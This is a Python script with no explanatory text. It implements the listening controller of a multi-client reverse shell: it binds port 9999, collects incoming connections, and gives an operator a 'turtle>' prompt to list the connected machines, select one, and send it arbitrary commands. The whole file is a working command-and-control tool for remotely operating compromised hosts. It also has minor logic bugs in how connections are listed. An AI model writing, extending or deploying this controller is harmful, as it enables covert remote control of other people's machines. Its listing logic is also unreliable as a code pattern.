import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
CONNECTIONS = []
ADDRESSES = []
queue = Queue()

def create_socket():
    try:
        global host
        global port
        global s
        
        s = socket.socket()
        host = ""
        port = 9999

    except socket.error as err:
        print("Socket creation error: " + str(err))

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        
        s.bind((host, port))
        s.listen(5)

    except socket.error as err:
        print("Socket binding error: " + str(err) + "\nRetrying...")
        bind_socket()

def accepting_connections():
    for c in CONNECTIONS:
        c.close()
    
    del ADDRESSES[:]
    del CONNECTIONS[:]
    
    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1)

            CONNECTIONS.append(connection)
            ADDRESSES.append(address)
            print("Connection established: " + address[0])

        except socket.error as err:
            print("Error in accepting connections: " + str(err))

def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

def list_connections():
    results = ''

    for i, conn in enumerate(CONNECTIONS):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del CONNECTIONS[i]
            del ADDRESSES[i]
            continue

        results = str(i) + "   " + str(ADDRESSES[i][0]) + "   " + str(ADDRESSES[i][1]) + "\n"

    print("----Clients----" + "\n" + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = CONNECTIONS[target]
        print("You are now connected to :" + str(ADDRESSES[target][0]))
        print(str(ADDRESSES[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            else:
                print("Type command\n")
        except:
            print("Error sending commands")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        threads = threading.Thread(target=work)
        threads.daemon = True
        threads.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()